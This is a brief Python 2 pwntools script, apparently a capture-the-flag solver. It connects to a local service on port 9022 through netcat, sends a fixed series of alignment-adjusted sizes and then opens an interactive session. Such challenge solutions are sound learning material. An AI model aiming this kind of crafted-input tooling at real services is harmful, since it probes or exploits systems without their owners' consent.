#!/usr/bin/env python2
# -*- coding: utf-8 -*-


from __future__ import print_function
from pwn import *
import os


SCRIPT_PATH = os.path.dirname(__file__)


def main():
    s = process(["nc", "0", "9022"])

    s.write("{:d}\n".format(8))
    s.write("{:d}\n".format(16))
    s.write("{:d}\n".format(32))
    s.write("{:d}\n".format(64 + 0x8))
    s.write("{:d}\n".format(128 + 0x8))
    s.write("{:d}\n".format(256 + 0x8))
    s.write("{:d}\n".format(512 + 0x8))
    s.write("{:d}\n".format(1024 + 0x8))
    s.write("{:d}\n".format(2048 + 0x8))
    s.write("{:d}\n".format(4096 + 0x8))

    s.interactive()

if __name__ == '__main__':
    main()
